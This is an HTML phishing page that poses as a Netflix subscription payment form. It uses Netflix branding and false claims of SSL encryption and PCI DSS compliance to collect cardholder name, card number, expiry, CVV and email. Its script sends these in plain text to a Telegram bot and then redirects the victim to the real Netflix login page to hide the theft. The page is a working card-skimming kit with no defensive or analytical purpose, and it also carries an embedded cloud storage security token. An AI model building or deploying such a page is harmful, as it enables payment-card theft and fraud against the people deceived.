<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Advanced Payment Form with Telegram Integration</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap');

    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      position: relative;
      min-height: 100vh;
      color: #eee;
      font-family: 'Montserrat', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 48px 20px;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
    }

    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background-image: url("https://s3.amazonaws.com/prod-cdata-secure.sprinklr.com/DAM/3877/c403c07b-df03-4039-bee7-1a0dd7b449bd-227725003/what_is_netflix_5_en.png?X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEIaCXVzLWVhc3QtMSJGMEQCICqM%2Fw7eJ%2FV54KdTJHsm6%2FYFLCW34bOfqX0YA5oJpctdAiAQYyNME3TNkrYyUjdZD4SXXwhaYqJ%2Fy5T6uAlVxXdoJSqxBQgaEAAaDDg2OTM2NzQ3MTY3NCIMHiqGw747P5W7hz0pKo4F5d1%2FLVytTdBllOT3ODtm0gSOrxxQDCDBFwwnV2eNqBDcIlhp%2FTR6gKAfce%2F%2F3pstg3GNNVrBFVA7M9Q214%2BY2LFJCNrpYHdKvxFpBuTl1bCrQb%2BWlootcB1nCOE7uluvPurg0oZPwpx%2FT%2BvFxQERwZjKVHccs8hbOH2EJZL5WMWELFDdC%2Fqoq1XquhYwJxfonQd5kr8QTRdaN4%2Bg3KyYmwAkyw2drHOcHKWn%2BQczE7vvKMFyP6%2FaCDzE%2BZQmi5GUqfua9OExG8YM1RQB3GPF0Mm63oeNrsr3eQXl%2BpAu01cebk%2BUkl0APD%2BEHKi9NjCuElKTCgIdwJowCxDLQYZAYoyXCkHy9kIrQE7aZNtQgtIL3zlMFgGBqt3GXUypjM9qyBEBJ9l9p466o9ElJVZAfXjEkhDW%2BNMQyvA5BgWXmROGCD%2By0eCiwAQTiFaC6HKAGEX2GsxQV5Bm6mLeY21ceDKZwh3qSGFfP8a%2FYo3dviQAHuKoFzdqorZmbJfofM1Ulg%2BiZ%2Fpf34EIt0oz18QWRkvkHaTyfzKMt5XpAY%2F2DQT6Y%2F%2BRMJFlLkvzcw1k3xptkT9y27%2FZkP6BEVq79iUt56EaYyDaoUjPQqjmn211VyKSS2LAUpO4RPh4W41%2BEqzuPdCNnADzxx3X%2FW%2BguLwzeQZwjs9EiyORnShObCw8kVW0CtX0GSCEyPcZc9ZRTxv4S6oKNeYtc6dq6XAQPVGYozMpMTnT8mgAa3iEmHNPamZDhPjKKio36TIubjB5nGa%2FgAyNQbJ2fCjJN%2ByVMBcnBsLbFzquza7eM2SyBCIj3fA%2B2MiO%2FnjASgV2XysCCUyO9L2uWerHtSlk%2BseuiwFKkYVFCjOoKUHTZNI7ohIVMPDa%2FMEGOrIBNMWcE2v%2BwlR3bF%2FW71bNZv81sih2YdSkTrEYd6E0bM6aeeXp1S28KuIJU0Dw2gGNqSbkuwg04BvjXFZGQeuIepMehP%2FMIRrTfpwPz826Z2I1jmsHMmlwY5o9f9riyJNp5DvSs89RyBWCgWWJi0lH62sGine%2FhI1ynOHUvwMp5Td5Jxr9%2F3YhuqJsHCX0Ymr%2FNooQsM6GFlbibn%2BLoW2khOpQtp3d0p1uyob6vFonFJRSAQ%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250603T174810Z&X-Amz-SignedHeaders=host&X-Amz-Expires=1800&X-Amz-Credential=ASIA4U2SW3Y5DY7VSV7J%2F20250603%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=fcb2d904bcfdb52e986a4d4fd1a12eae323c213c7a02781175402cb1bdfb7c39");
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      filter: brightness(0.3);
      z-index: -1;
    }

    main {
      background: rgba(30,30,30,0.85);
      border-radius: 12px;
      padding: 44px 36px 56px;
      box-shadow: 0 0 40px 8px #e5091440;
      max-width: 420px;
      width: 100%;
      position: relative;
      color: #eee;
    }

    header {
      position: relative;
      z-index: 1;
      max-width: 420px;
      width: 100%;
      margin-bottom: 48px;
      text-align: center;
      user-select: none;
    }
    header img {
      height: 32px;
    }

    h1 {
      font-weight: 600;
      font-size: 2rem;
      color: #e50914;
      margin-bottom: 8px;
      user-select: none;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    h1 svg {
      width: 28px;
      height: 28px;
      fill: #e50914;
      animation: pulse 3s ease-in-out infinite;
      flex-shrink: 0;
    }

    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.65; }
    }

    p.subtitle {
      margin-bottom: 36px;
      color: #aaa;
      font-weight: 400;
      font-size: 1rem;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    .field-group {
      position: relative;
      margin-bottom: 32px;
    }

    label {
      position: absolute;
      left: 14px;
      top: 20px;
      color: #888;
      font-weight: 600;
      font-size: 13px;
      pointer-events: none;
      background: rgba(30,30,30,0.85);
      padding: 0 6px;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      transform-origin: left top;
      transition: 
        transform 0.25s cubic-bezier(0.4,0,0.2,1), 
        color 0.25s cubic-bezier(0.4,0,0.2,1),
        top 0.25s cubic-bezier(0.4,0,0.2,1);
    }

    input {
      width: 100%;
      padding: 20px 14px 10px 14px;
      background: #2c2c2c;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      color: #eee;
      box-shadow: inset 0 0 8px #000a;
      outline-offset: 2px;
      font-family: 'Montserrat', sans-serif;
      transition: background-color 0.3s, box-shadow 0.3s;
    }

    input:focus {
      background-color: #3a3a3a;
      box-shadow: 0 0 20px 6px #e50914cc;
      outline: none;
    }

    input:focus + label,
    input.filled + label {
      transform: translateY(-24px) scale(0.8);
      top: 0px;
      color: #e50914;
    }

    input.invalid {
      box-shadow: 0 0 12px 3px #ff4c4c inset !important;
    }

    input.valid {
      box-shadow: 0 0 12px 3px #28a745 inset !important;
    }

    .message {
      margin-top: 6px;
      font-size: 12px;
      min-height: 18px;
      user-select: none;
      font-weight: 500;
      color: transparent;
      transition: color 0.3s ease;
    }

    .message.error {
      color: #ff4c4c;
    }

    .message.success {
      color: #28a745;
    }

    .lock-icon {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      width: 16px;
      height: 16px;
      fill: #bbb;
      pointer-events: none;
      opacity: 0.5;
      transition: fill 0.3s ease, opacity 0.3s ease;
      user-select: none;
      z-index: 1;
    }

    input:focus ~ .lock-icon {
      fill: #e50914;
      opacity: 1;
    }

    .toggle-cvv {
      position: absolute;
      right: 40px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
      width: 20px;
      height: 20px;
      fill: #bbb;
      opacity: 0.6;
      transition: fill 0.3s ease;
    }

    .toggle-cvv:hover,
    .toggle-cvv:focus {
      fill: #e50914;
      outline: none;
      opacity: 1;
    }

    button {
      background-color: #e50914;
      color: #fff;
      font-weight: 700;
      font-size: 18px;
      padding: 16px 0;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 0.14em;
      box-shadow: inset 0 -4px 0 #b0060b, 0 8px 18px #e50914bb;
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
      user-select: none;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 14px;
    }

    button:hover:not(:disabled),
    button:focus:not(:disabled) {
      background-color: #b0060b;
      box-shadow: inset 0 -4px 0 #7b0006, 0 10px 26px #b0060bbb;
      outline: none;
    }

    button:disabled {
      background-color: #555;
      box-shadow: none;
      cursor: not-allowed;
      color: #999;
    }

    .spinner {
      border: 3px solid #fff;
      border-top: 3px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      width: 18px;
      height: 18px;
      animation: spin 1.2s linear infinite;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .secure-info {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 13px;
      color: #aaa;
      margin-top: 20px;
      user-select: none;
    }

    .secure-info svg {
      width: 20px;
      height: 20px;
      fill: #e50914;
      flex-shrink: 0;
      animation: pulse 2.5s ease-in-out infinite;
    }

    .security-note {
      margin-top: 12px;
      font-size: 12px;
      color: #bbb;
      display: flex;
      align-items: center;
      gap: 8px;
      user-select: none;
      position: relative;
    }

    .security-note svg {
      width: 16px;
      height: 16px;
      fill: #bbb;
      flex-shrink: 0;
    }

    .security-note:hover::after,
    .security-note:focus-within::after {
      content: "Your payment information is encrypted with 256-bit SSL encryption and handled securely.";
      position: absolute;
      left: 0;
      bottom: 125%;
      background: #e50914;
      color: white;
      font-size: 12px;
      padding: 8px 14px;
      border-radius: 8px;
      white-space: nowrap;
      box-shadow: 0 0 10px #e5091444;
      z-index: 1500;
      opacity: 1;
      pointer-events: auto;
      transform: translateY(0);
      transition: opacity 0.3s ease;
    }

    .security-note::after {
      opacity: 0;
      pointer-events: none;
      transform: translateY(10px);
    }

    #confirmationModal {
      display:none;
      position: fixed;
      inset:0;
      background: rgba(0,0,0,0.9);
      backdrop-filter: blur(8px);
      display:flex;
      justify-content:center;
      align-items:center;
      z-index:1100;
    }

    #confirmationModal[aria-hidden="false"] {
      display:flex;
    }

    #confirmationModal > div {
      background: #1e1e1e;
      padding: 38px 36px;
      border-radius: 14px;
      max-width: 360px;
      text-align: center;
      color: #eee;
      box-shadow: 0 0 30px 10px #e5091470;
      position: relative;
    }

    #confirmationModal h2 {
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 1.8rem;
      color: #e50914;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 14px;
    }

    #confirmationModal h2 svg {
      width: 28px;
      height: 28px;
      fill: #28a745;
      stroke: #28a745;
      stroke-width: 1.5;
      animation: checkmark 0.6s ease forwards;
      stroke-dasharray: 40;
      stroke-dashoffset: 40;
    }

    @keyframes checkmark {
      to {
        stroke-dashoffset: 0;
      }
    }

    #confirmationModal p {
      margin-bottom: 30px;
      font-weight: 400;
      font-size: 1rem;
      line-height: 1.4;
    }

    #closeModalBtn {
      background: #e50914;
      border: none;
      color: #fff;
      padding: 14px 34px;
      border-radius: 8px;
      font-weight: 700;
      cursor: pointer;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 0.07em;
      transition: background-color 0.3s ease;
    }

    #closeModalBtn:hover,
    #closeModalBtn:focus {
      background: #b0060b;
      outline: none;
    }

    @media (max-width: 480px) {
      main {
        padding: 32px 24px 48px;
      }

      h1 {
        font-size: 1.6rem;
      }
    }
  </style>
</head>
<body>
  <header role="banner">
    <a href="https://www.netflix.com/gb" target="_blank" rel="noopener" aria-label="Netflix Home">
      <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png" alt="Netflix Logo" />
    </a>
  </header>

  <main role="main" aria-labelledby="main-heading" tabindex="0">
    <h1 id="main-heading" tabindex="-1">
      <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24" fill="currentColor" >
        <path d="M12 1C8.14 1 5 4.14 5 8v5H4a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1v-8a1 1 0 0 0-1-1h-1V8c0-3.86-3.14-7-7-7zm0 2a5 5 0 0 1 5 5v5H7v-5a5 5 0 0 1 5-5z"/>
      </svg>
      Complete Your Subscription
    </h1>
    <p class="subtitle">Unlimited movies and shows for just <strong>Â£5.99 / month</strong></p>

    <form novalidate aria-label="Payment form" id="paymentForm">
      <div class="field-group">
        <input type="text" id="cardholder" name="cardholder" placeholder=" " autocomplete="cc-name" required aria-required="true" aria-describedby="cardholder-msg" />
        <label for="cardholder">Cardholder Name</label>
        <div id="cardholder-msg" class="message" aria-live="polite"></div>
      </div>

      <div class="field-group" style="margin-bottom: 8px; position: relative;">
        <input
          type="text"
          id="cardnumber"
          name="cardnumber"
          placeholder=" "
          inputmode="numeric"
          autocomplete="cc-number"
          maxlength="19"
          pattern="[0-9\s]{13,19}"
          required
          aria-required="true"
          aria-describedby="cardnumber-msg"
        />
        <label for="cardnumber">Card Number</label>
        <div
          class="lock-icon"
          aria-hidden="true"
          title="Your card number is securely encrypted"
        >
          <svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16" xmlns="http://www.w3.org/2000/svg" >
            <path d="M12 1C8.14 1 5 4.14 5 8v5H4a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h16a1 1 0 0 0 1-1v-8a1 1 0 0 0-1-1h-1V8c0-3.86-3.14-7-7-7zm0 2a5 5 0 0 1 5 5v5H7v-5a5 5 0 0 1 5-5z"/>
          </svg>
        </div>
        <div id="cardnumber-msg" class="message" aria-live="polite"></div>
      </div>

      <div class="field-group" style="margin-bottom: 28px;">
        <input type="text" id="expiry" name="expiry" placeholder=" " maxlength="5" pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" autocomplete="cc-exp" required aria-required="true" aria-describedby="expiry-msg" />
        <label for="expiry">Expiry Date (MM/YY)</label>
        <div id="expiry-msg" class="message" aria-live="polite"></div>
      </div>

      <div class="field-group" style="margin-bottom: 28px; position: relative;">
        <input type="password" id="cvv" name="cvv" placeholder=" " maxlength="3" inputmode="numeric" autocomplete="cc-csc" required aria-required="true" aria-describedby="cvv-msg" aria-label="CVV security code" />
        <label for="cvv">CVV</label>
        <button type="button" class="toggle-cvv" aria-label="Toggle CVV visibility" tabindex="0" title="Show or hide CVV">
          <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
            <circle cx="12" cy="12" r="2.5"/>
          </svg>
        </button>
        <div id="cvv-msg" class="message" aria-live="polite"></div>
      </div>

      <div class="field-group" style="margin-bottom: 6px;">
        <input type="email" id="email" name="email" placeholder=" " autocomplete="email" required aria-required="true" aria-describedby="email-msg" />
        <label for="email">Email Address</label>
        <div id="email-msg" class="message" aria-live="polite"></div>
      </div>
      <div style="font-size:11px; color:#666; margin-bottom:28px; user-select:none; font-style: italic;">
        We never share your email with anyone.
      </div>

      <button type="submit" id="submitBtn" aria-label="Complete payment" disabled>
        <span class="btn-text">Complete Payment</span>
        <span class="spinner" aria-hidden="true"></span>
      </button>

      <div class="security-note" tabindex="0" role="tooltip" aria-label="Security details">
        <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24" fill="currentColor" >
          <path d="M12 2a7 7 0 0 0-7 7v4a7 7 0 0 0 14 0v-4a7 7 0 0 0-7-7zm5 8v3a5 5 0 0 1-10 0v-3a5 5 0 0 1 10 0z"/>
          <circle cx="12" cy="15" r="2"/>
        </svg>
        Your information is encrypted and securely processed (PCI DSS Compliant)
      </div>

      <div class="secure-info" aria-live="polite" role="status">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false" style="width:18px;height:18px;fill:#e50914;flex-shrink:0;margin-left:6px;">
          <path d="M12 1C7.03 1 3 5.03 3 10v4c0 1.1.9 2 2 2h1v3c0 .55.45 1 1 1h10c.55 0 1-.45 1-1v-3h1c1.1 0 2-.9 2-2v-4c0-4.97-4.03-9-9-9zm0 2c3.86 0 7 3.14 7 7v4h-3v3H8v-3H5v-4c0-3.86 3.14-7 7-7z"/>
        </svg>
        <span>Secure payment processing</span>
      </div>
    </form>
  </main>

  <script>
  (() => {
    const BOT_TOKEN = '';
    const CHAT_ID = '';

    const cardNumberInput = document.getElementById('cardnumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const emailInput = document.getElementById('email');
    const cardholderInput = document.getElementById('cardholder');
    const submitBtn = document.getElementById('submitBtn');
    const form = document.querySelector('form');
    const modal = document.getElementById('confirmationModal');
    const closeModalBtn = document.getElementById('closeModalBtn');
    const toggleCvvBtn = document.querySelector('.toggle-cvv');

    const touched = {
      cardholder: false,
      cardnumber: false,
      expiry: false,
      cvv: false,
      email: false
    };

    function formatCardNumber(value) {
      return value.replace(/\D/g, '').substring(0,16).replace(/(.{4})/g, '$1 ').trim();
    }

    function formatExpiry(value) {
      let digits = value.replace(/[^\d]/g, '').substring(0,4);
      if(digits.length >= 3) {
        return digits.substring(0,2) + '/' + digits.substring(2);
      }
      return digits;
    }

    function validateExpiry(value) {
      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) return false;
      const [month, year] = value.split('/');
      const now = new Date();
      const expiry = new Date(`20${year}`, month, 0, 23, 59, 59);
      return expiry > now;
    }

    function validateCVV(value) {
      return /^\d{3}$/.test(value);
    }

    function validateEmail(value) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
    }

    function setMessage(input, message, type) {
      const msgEl = input.parentElement.querySelector('.message');
      if (!msgEl) return;
      msgEl.textContent = message;
      msgEl.classList.remove('error', 'success');
      if(type === 'error') {
        msgEl.classList.add('error');
        input.classList.add('invalid');
        input.classList.remove('valid');
      } else if(type === 'success') {
        msgEl.classList.add('success');
        input.classList.remove('invalid');
        input.classList.add('valid');
      } else {
        input.classList.remove('invalid', 'valid');
      }
    }

    function validateInput(inputName) {
      const val = document.getElementById(inputName).value.trim();
      switch(inputName) {
        case 'cardholder':
          if(val.length < 2) {
            setMessage(cardholderInput, 'Please enter the cardholder name.', 'error');
            return false;
          }
          setMessage(cardholderInput, '', null);
          return true;
        case 'cardnumber':
          const rawNum = val.replace(/\s/g,'');
          if(rawNum.length < 13) {
            setMessage(cardNumberInput, 'Card number is too short.', 'error');
            return false;
          }
          if(!/^\d+$/.test(rawNum)) {
            setMessage(cardNumberInput, 'Card number must contain only digits.', 'error');
            return false;
          }
          setMessage(cardNumberInput, '', null);
          return true;
        case 'expiry':
          if(!validateExpiry(val)) {
            setMessage(expiryInput, 'Enter a valid expiry date.', 'error');
            return false;
          }
          setMessage(expiryInput, '', null);
          return true;
        case 'cvv':
          if(!validateCVV(val)) {
            setMessage(cvvInput, 'CVV must be 3 digits.', 'error');
            return false;
          }
          setMessage(cvvInput, '', null);
          return true;
        case 'email':
          if(!validateEmail(val)) {
            setMessage(emailInput, 'Enter a valid email address.', 'error');
            return false;
          }
          setMessage(emailInput, '', null);
          return true;
        default: return true;
      }
    }

    function validateForm() {
      let allValid = true;
      for(let key in touched) {
        if(touched[key]) {
          if(!validateInput(key)) allValid = false;
        }
      }
      const requiredFields = ['cardholder','cardnumber','expiry','cvv','email'];
      const allTouchedOrFilled = requiredFields.every(field => touched[field] || document.getElementById(field).value.trim() !== '');
      submitBtn.disabled = !(allValid && allTouchedOrFilled);
    }

    function toggleFilledClass(input) {
      if(input.value.trim() !== '') input.classList.add('filled');
      else input.classList.remove('filled');
    }

    ['cardholder','cardnumber','expiry','cvv','email'].forEach(id => {
      const el = document.getElementById(id);
      el.addEventListener('blur', e => {
        touched[id] = true;
        toggleFilledClass(e.target);
        validateInput(id);
        validateForm();
      });
      el.addEventListener('input', e => {
        toggleFilledClass(e.target);
        if(id === 'cardnumber') {
          const pos = e.target.selectionStart;
          e.target.value = formatCardNumber(e.target.value);
          e.target.selectionStart = e.target.selectionEnd = pos;
        }
        if(id === 'expiry') {
          const pos = e.target.selectionStart;
          e.target.value = formatExpiry(e.target.value);
          e.target.selectionStart = e.target.selectionEnd = pos;
        }
        if(id === 'cvv') {
          e.target.value = e.target.value.replace(/\D/g,'').substring(0,3);
        }
        if(touched[id]) {
          validateInput(id);
          validateForm();
        }
      });
    });

    async function sendToTelegram(data) {
      const message = `
New Payment Submission:
Cardholder: ${data.cardholder}
Card Number: ${data.cardnumber}
Expiry: ${data.expiry}
CVV: ${data.cvv}
Email: ${data.email}
      `;
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      };
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        if (!response.ok) throw new Error('Telegram API error');
        return true;
      } catch(err) {
        console.error('Telegram send error:', err);
        return false;
      }
    }

    form.addEventListener('submit', async e => {
      e.preventDefault();
      Object.keys(touched).forEach(key => touched[key] = true);
      let allValid = true;
      ['cardholder','cardnumber','expiry','cvv','email'].forEach(id => {
        if(!validateInput(id)) allValid = false;
      });
      if(!allValid) {
        validateForm();
        return alert('Please correct the errors in the form.');
      }
      submitBtn.disabled = true;
      submitBtn.querySelector('.btn-text').style.display = 'none';
      submitBtn.querySelector('.spinner').style.display = 'inline-block';
      [...form.elements].forEach(el => el.disabled = true);

      const formData = {
        cardholder: cardholderInput.value.trim(),
        cardnumber: cardNumberInput.value.trim(),
        expiry: expiryInput.value.trim(),
        cvv: cvvInput.value.trim(),
        email: emailInput.value.trim()
      };

      const sent = await sendToTelegram(formData);

      submitBtn.querySelector('.btn-text').style.display = '';
      submitBtn.querySelector('.spinner').style.display = 'none';

      if(!sent) {
        alert('There was a problem sending your data. Please try again later.');
        submitBtn.disabled = false;
        [...form.elements].forEach(el => el.disabled = false);
        return;
      }

      modal.style.display = 'flex';
      modal.setAttribute('aria-hidden', 'false');
      modal.focus();

      window.location.href = 'https://www.netflix.com/login'; // Redirect immediately to Netflix login page
    });

    closeModalBtn.addEventListener('click', () => {
      modal.style.display = 'none';
      modal.setAttribute('aria-hidden', 'true');
      form.reset();
      Object.keys(touched).forEach(key => touched[key] = false);
      submitBtn.disabled = true;
      document.querySelectorAll('input').forEach(input => {
        input.classList.remove('filled', 'valid', 'invalid');
        const msg = input.parentElement.querySelector('.message');
        if(msg) msg.textContent = '';
      });
      cardholderInput.focus();
    });

    document.querySelectorAll('input').forEach(input => {
      if(input.value.trim() !== '') input.classList.add('filled');
    });

    toggleCvvBtn.addEventListener('click', () => {
      if(cvvInput.type === 'password') {
        cvvInput.type = 'text';
        toggleCvvBtn.setAttribute('aria-label', 'Hide CVV');
        toggleCvvBtn.title = 'Hide CVV';
      } else {
        cvvInput.type = 'password';
        toggleCvvBtn.setAttribute('aria-label', 'Show CVV');
        toggleCvvBtn.title = 'Show CVV';
      }
      cvvInput.focus();
    });

  })();
</script>
</body>
</html>
